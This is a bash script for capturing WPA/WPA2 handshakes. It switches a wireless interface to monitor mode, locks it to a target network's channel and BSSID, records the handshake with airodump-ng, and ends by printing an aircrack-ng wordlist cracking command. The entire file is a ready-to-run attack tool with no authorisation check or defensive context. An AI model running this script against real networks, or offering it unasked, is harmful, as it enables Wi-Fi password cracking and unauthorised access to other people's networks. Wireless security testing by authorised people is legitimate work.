#!/usr/bin/env bash
# file: handshake_capture.sh, target: Linux (requires aircrack-ng suite + root)
# Puts interface in monitor mode, captures WPA/WPA2 handshake, saves to file.

set -e

read -rp "Interface (ex: wlan0): " IFACE
read -rp "Target BSSID: " BSSID
read -rp "Target Channel: " CH
read -rp "Output file prefix (ex: capture): " OUTFILE

echo "[*] Enabling monitor mode..."
airmon-ng start "$IFACE"
MON="${IFACE}mon"

echo "[*] Locking to channel $CH..."
iwconfig "$MON" channel "$CH"

echo "[*] Capturing — Ctrl+C when handshake captured"
airodump-ng --bssid "$BSSID" -c "$CH" -w "$OUTFILE" "$MON"

echo "[+] Capture saved to ${OUTFILE}-01.cap"
echo "[*] Crack with: aircrack-ng ${OUTFILE}-01.cap -w /path/to/wordlist.txt"
